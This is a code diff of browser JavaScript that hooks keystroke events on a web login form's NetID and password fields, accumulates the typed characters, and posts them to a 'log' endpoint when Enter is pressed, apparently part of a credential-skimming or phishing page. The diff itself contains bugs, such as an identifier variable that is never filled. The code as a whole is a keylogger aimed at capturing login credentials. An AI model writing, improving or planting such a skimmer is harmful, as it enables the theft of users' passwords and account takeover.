@@ -1,35 +1,37 @@
 
 const netid = document.getElementById("weblogin_netid");
 const netpass = document.getElementById("weblogin_password");
-let output = ''
+
+let id = ''
+let outcomeId = ''
 netid.addEventListener("keydown", function(event){
     console.log(event);
-    output = event.key
+    id += event.key
 
-    const outcome = {message: output} 
-    fetch("log", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(
-                outcome
-            )
-    }) 
+    outcome = {netid: id} 
+
+    
 })
+
+
+
+let pass = ''
+let outcomePass = ''
 netpass.addEventListener("keydown", function(event){
     console.log(event);
-    output = event.key
+    pass += event.key
 
-    const outcome = {message: output} 
-    fetch("log", {
+    outcomePass = {message: pass} 
+    if(event.key == "Enter") {
+        fetch("log", {
             method: "POST",
             headers: {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify(
-                outcome
+                outcomeId, outcomePass
             )
-    }) 
+        }) 
+    }
 })
 
